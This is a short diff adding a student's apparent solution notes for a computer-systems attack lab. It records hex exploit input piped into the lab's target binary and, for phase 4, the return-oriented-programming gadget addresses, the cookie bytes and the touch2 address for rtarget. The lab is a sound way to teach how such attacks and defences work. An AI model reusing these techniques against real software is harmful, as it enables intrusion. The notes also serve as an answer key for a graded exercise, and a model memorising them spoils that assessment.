@@ -56,3 +56,22 @@ so solution 3:
 35 65 62 62 30 64 31 35
 
 cat solution3.txt | ./hex2raw | /.ctarget
+
+phase 4
+
+4016c4 + 5 = 4016c9 <--- this is the byte of code we want to pop rax
+
+cookie
+15 0d bb 5e 00 00 00 00
+
+gadget 2
+
+find a piece of code between start farm and end farm that sets rax to rdi
+mov %rax, %rdi
+48 89 c7
+
+address: 4016b6
+4016b6 + 2 is 48 89 c7
+
+then address of touch 2 in rtarget
+4014fc
